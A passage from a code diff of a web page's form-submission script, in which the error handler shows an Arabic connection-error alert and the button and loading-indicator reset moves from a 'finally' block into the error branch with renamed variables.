                 alert('حدث خطأ أثناء الإرسال. تأكد من اتصالك بالإنترنت.');
                 console.error(error);
-            } finally {
-                submitBtn.classList.remove('hidden');
-                loadingMsg.classList.add('hidden');
+                btn.classList.remove('hidden');
+                loading.classList.add('hidden');
             }
         });
     </script>
